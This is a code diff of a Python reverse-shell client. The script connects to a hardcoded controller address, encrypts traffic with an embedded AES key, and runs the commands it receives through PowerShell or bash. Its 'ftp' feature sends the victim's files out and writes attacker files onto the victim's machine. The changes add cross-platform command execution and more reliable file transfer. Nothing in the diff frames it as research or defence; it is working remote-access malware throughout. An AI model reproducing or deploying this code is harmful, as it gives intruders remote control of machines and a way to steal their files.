@@ -6,7 +6,7 @@ import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 
-HOST = "192.168.140.65"
+HOST = "192.168.30.52"
 PORT = 6565
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
@@ -37,6 +37,7 @@ def first_connect(client):
 
 
 def connect():
+    os_name = os.name
     while 1:
         pwd = os.getcwd()
         client.send(encrypt_data(pwd.encode('utf-8')))
@@ -49,10 +50,17 @@ def connect():
                 info("[*] Connection closed !!!",client)
                 break
             elif command.split(" ")[0] == "ftp":
-                stdout = ftp(command,client)
+                stdout = ftp(command.split(" "),client)
+                time.sleep(0.4)
                 info(stdout,client)
+                time.sleep(0.4)
                 continue
-            stdout = subprocess.check_output(["powershell", "-Command",command])
+            
+            if os_name == "nt":
+                stdout = subprocess.check_output(["powershell.exe", "-Command",command],shell=True)
+            elif os_name == "posix":
+                stdout = subprocess.check_output(["/bin/bash", "-c",command],shell=False)
+                
         except :
             stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
             
@@ -67,7 +75,6 @@ def connect():
 def ftp(command,client):
     tip = command[1]
     file = command[2]
-
 
     def write(file,data):
         with open(file,'wb') as f:
@@ -92,26 +99,34 @@ def ftp(command,client):
 
     def download(file,client):
         size = int(client.recv(4096).decode('utf-8'))
+        if size == -1:
+            return "[*] Not found !!!"
         data = []
         client.send(b"ready")
         for i in range(size):
             chunk = client.recv(409600)
             data.append(chunk)
         binary_data = b''.join(data)  
-        write(f"./{file}",binary_data)
+        write(f"{file}",binary_data)
+        return "[*] Data uploaded successful."
 
     def upload(file,client):
-        file = read(f".{file}")
-        parse_file =parse_chunks(file)
-        client.send(str(len(parse_file)).encode('utf-8'))
-        client.recv(409600)
-        for chunk in parse_file:
-            client.send(chunk)
-    
+        try:
+            file = read(f"{file}")
+            parse_file =parse_chunks(file)
+            client.send(str(len(parse_file)).encode('utf-8'))
+            client.recv(409600)
+            for chunk in parse_file:
+                client.send(chunk)
+            return "[*] Data downloaded successful."
+        except:
+            client.send(b'-1')
+            return "[*] Not found !!!"
+            
     if tip == "-u":
-        download(file,client)
+        return download(file,client)
     elif tip == "-d":
-        upload(file,client)
+        return upload(file,client)
     else :
         return "[*] Wrong command !!!"  
 
